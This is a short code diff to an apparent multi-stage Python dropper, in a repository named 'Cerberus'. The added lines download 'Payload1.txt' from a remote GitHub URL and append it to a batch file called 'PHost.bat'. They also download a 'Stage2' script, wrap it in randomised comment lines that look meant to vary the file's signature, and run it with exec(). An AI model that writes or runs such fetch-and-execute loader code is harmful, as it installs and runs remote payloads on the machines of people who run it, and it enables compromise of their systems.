@@ -14,10 +14,14 @@ if os.path.isfile(filename) == False:
     file = open('PHost.bat', 'a')
     file.close()
 
-with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Payload1.txt") as response:
-    data = response.read().decode("utf-8") # Takes code from URL and decodes it to remove useless newline characters in code
-    with open(filename, "a+") as fp: fp.write(data) # Opens paylaod in read and write mode and appends code retrieved into it
+with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Payload1.txt") as retrieve:
+    data = retrieve.read().decode("utf-8")                       # Takes code from URL and decodes it to remove useless newline characters in code
+    with open(filename, "a+") as file: 
+        file.write("rem" + rN + "\n" + data)                     # Opens paylaod in read and write mode and appends code retrieved into it
 
-urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage2.txt", path) # Next Stage
+with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage2.txt") as retrieve:
+    data = retrieve.read().decode("utf-8")
+    with open(path, "a+") as file:
+        file.write("#" + rN + "\n" + str(data) + "\n" + "#" + rN)
 
 exec(open(path).read()) # Runs Stage 2 File
